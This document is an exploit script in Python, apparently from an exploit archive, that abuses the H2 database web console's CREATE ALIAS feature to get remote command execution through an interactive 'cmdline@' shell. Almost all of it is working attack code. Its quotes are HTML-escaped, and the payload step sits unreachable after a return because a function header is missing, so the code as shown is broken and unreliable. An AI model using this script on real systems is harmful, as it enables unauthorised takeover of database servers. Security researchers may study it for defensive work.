Exploit Title: H2 Database Alias Abuse
Date: 05/04/2018
Exploit Author: gambler
Vendor Homepage:www.h2database.com
Software Link: http://www.h2database.com/html/download.html
Version: all versions
Tested on: Linux, Mac OS
&#039;&#039;&#039;
 
import sys
import argparse
import html
import requests
 
# Blogpost about it
# https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
 
def getCookie(host):
    url = &#039;http://{}&#039;.format(host)
    r = requests.get(url)
    path = r.text.split(&#039;href = &#039;)[1].split(&#039;;&#039;)[0].replace("&#039;","").replace(&#039;.jsp&#039;,&#039;.do&#039;)
    return &#039;{}/{}&#039;.format(url,path)
 
def login(url,user,passwd,database):
    data = {&#039;language&#039;:&#039;en&#039;,&#039;setting&#039;:&#039;Generic+H2+(Embedded)&#039;,&#039;name&#039;:&#039;Generic+H2+(Embedded)&#039;,&#039;driver&#039;:&#039;org.h2.Driver&#039;,&#039;url&#039;:database,&#039;user&#039;:user,&#039;password&#039;:passwd}
    r = requests.post(url,data=data)
    if &#039;<th class="login">Login</th>&#039; in r.text:
        return False
    return True
 
    cmd = &#039;&#039;&#039;CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;&#039;&#039;&#039;
    url = url.replace(&#039;login&#039;,&#039;query&#039;)
    r = requests.post(url,data={&#039;sql&#039;:cmd})
    if not &#039;Syntax error&#039; in r.text:
        return url
    return False
 
def execve(url,cmd):
    r = requests.post(url,data={&#039;sql&#039;:"CALL EXECVE(&#039;{}&#039;)".format(cmd)})
    try:
        print(html.unescape(r.text.split(&#039;</th></tr><tr><td>&#039;)[1].split(&#039;</td>&#039;)[0].replace(&#039;<br />&#039;,&#039;\n&#039;).replace(&#039;&nbps;&#039;,&#039; &#039;)).encode(&#039;utf-8&#039;).decode(&#039;utf-8&#039;,&#039;ignore&#039;))
    except Exception as e:
        print(&#039;Something goes wrong&#039;)
        print(e)
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group(&#039;required arguments&#039;)
    required.add_argument("-H",
            "--host",
            metavar=&#039;127.0.0.1:4336&#039;,
            help="Specify a host",
            required=True)
    required.add_argument("-d",
            "--database-url",
            metavar=&#039;jdbc:h2~/test&#039;,
            default="jdbc:h2~/test",
            help="Database URL",
            required=False)
    required.add_argument("-u",
            "--user",
            metavar=&#039;username&#039;,
            default="sa",
            help="Username to log on H2 Database, default sa",
            required=False)
    required.add_argument("-p",
            "--password",
            metavar=&#039;password&#039;,
            default="",
            help="Password to log on H2 Database, default None",
            required=False)
    args = parser.parse_args()
 
url = getCookie(args.host)
if login(url,args.user,args.password,args.database_url):
    if url:
        while 1:
            try:
                cmd = input(&#039;cmdline@ &#039;)
                execve(url,cmd)
            except KeyboardInterrupt:
                print("\nProfessores ensinam, nadadores Nadam e Hackers Hackeiam")
                sys.exit(0)
    else:
        print(&#039;ERROR - Inserting Payload&#039;)
        print("Something goes wrong, exiting...")
else:
    print("ERROR - Auth")
    print("Something goes wrong, exiting...")

